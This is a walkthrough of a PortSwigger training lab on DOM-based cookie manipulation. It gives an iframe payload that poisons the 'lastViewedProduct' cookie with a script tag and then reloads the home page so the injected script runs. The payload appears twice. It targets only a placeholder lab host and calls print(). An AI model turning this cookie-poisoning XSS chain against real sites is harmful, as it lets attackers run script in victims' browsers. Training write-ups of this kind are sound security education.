# Lab: DOM-based cookie manipulation (Practitioner)

**Lab:** [https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)

**Task (from PortSwigger):**  
This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that will cause XSS on a different page and call the `print()` function. You will need to use the exploit server to direct the victim to the correct pages.

## Vulnerability
The site sets a client-side cookie `lastViewedProduct` to the last product URL. That value is later written into the DOM unsafely on the home page.

## Solution

Exploit server body:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```

### Steps
1. Product pages set `lastViewedProduct` from the current URL.
2. Load a product URL that breaks out of the cookie context with a script payload.
3. Immediately redirect the iframe to the home page so the poisoned cookie is read and executed.
4. Deliver to the victim.

## Final Exploit Payload
```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```
